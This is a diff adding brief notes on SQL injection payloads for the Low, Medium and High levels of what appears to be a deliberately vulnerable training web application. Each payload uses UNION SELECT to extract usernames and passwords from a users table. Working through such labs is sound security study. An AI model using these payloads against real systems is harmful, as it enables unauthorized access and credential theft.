@@ -1,0 +1,11 @@
+Low 
+    ' union select user,password from users#
+
+Medium
+    Change one of the option values to 
+        1 UNION select user,password from users
+    (as it does not have quotes)
+
+High
+    ' union select user,password from users#
+    In the tab that opens up
